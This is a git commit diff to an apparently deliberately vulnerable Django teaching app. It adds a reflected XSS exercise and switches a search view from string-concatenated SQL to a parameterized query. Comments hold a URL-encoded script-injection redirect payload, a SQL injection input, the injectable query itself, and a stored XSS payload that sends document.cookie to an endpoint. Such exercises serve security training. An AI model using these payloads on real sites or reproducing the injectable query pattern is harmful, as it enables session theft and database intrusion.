7f2105c7f5f6f3abac55b56933548cbdd985cd90
Kryštof Bezděk <krystof.bezdek@gmail.com>
2024-01-30 17:02:20 +0000

    Adding Reflected Exercise

--- xss_app/views.py
+++ xss_app/views.py
@@ -25,6 +25,7 @@ class DetailView(generic.DetailView):
     template_name = "xss_app/detail.html"
 
 
+# http://127.0.0.1:8000/xss_app/search/?q=%3Cscript%3Edocument.addEventListener(%27DOMContentLoaded%27,%20(event)%20=%3E%20{%20window.location.href%20=%20%27https://www.google.com%27;%20});%3C/script%3E
 class SearchResultsView(generic.ListView):
     model = Blog
     template_name = "xss_app/search.html"
@@ -33,30 +34,30 @@ class SearchResultsView(generic.ListView):
         query = self.request.GET.get("q") # supply anything' OR 1 = 1 --;
 
         # SAFE
-        # param = f'%{query}%'
-        # object_list = Blog.objects.raw("SELECT * FROM xss_app_blog WHERE headline LIKE %s", [param])
+        param = f'%{query}%'
+        object_list = Blog.objects.raw("SELECT * FROM xss_app_blog WHERE headline LIKE %s", [param])
 
-        with connection.cursor() as cursor:
-            cursor.execute("SELECT * FROM xss_app_blog WHERE headline LIKE '%" + query + "%'")
-            rows = cursor.fetchall()
-
-        results = []
-        for row in rows:
-            row_data = {
-                "id": row[0],
-                "headline": row[1],
-                "content": row[2],
-                "author": row[3],
-                "pub_date": row[4]
-            }
-            results.append(row_data)
-        return results
+        # UNSAFE - SQL INJECTION
+        # with connection.cursor() as cursor:
+        #     cursor.execute("SELECT * FROM xss_app_blog WHERE headline LIKE '%" + query + "%'")
+        #     rows = cursor.fetchall()
+        #
+        # results = []
+        # for row in rows:
+        #     row_data = {
+        #         "id": row[0],
+        #         "headline": row[1],
+        #         "content": row[2],
+        #         "author": row[3],
+        #         "pub_date": row[4]
+        #     }
+        #     results.append(row_data)
+        return object_list
 
     def get_context_data(self, **kwargs):
         context = super(SearchResultsView, self).get_context_data(**kwargs)
         context['search_query'] = self.request.GET.get("q")
         return context
-
 
 # <script>function callfunc() {fetch('http://127.0.0.1:8000/xss_app/create?headline=HACKED&content=' + document.cookie).then(response => response.text()).then(data => {console.log(data);}).catch(error => {console.error('Error:', error);});}</script><div onmouseover="callfunc()">You have been hacked</div>
 class BlogPostCreateView(generic.View):
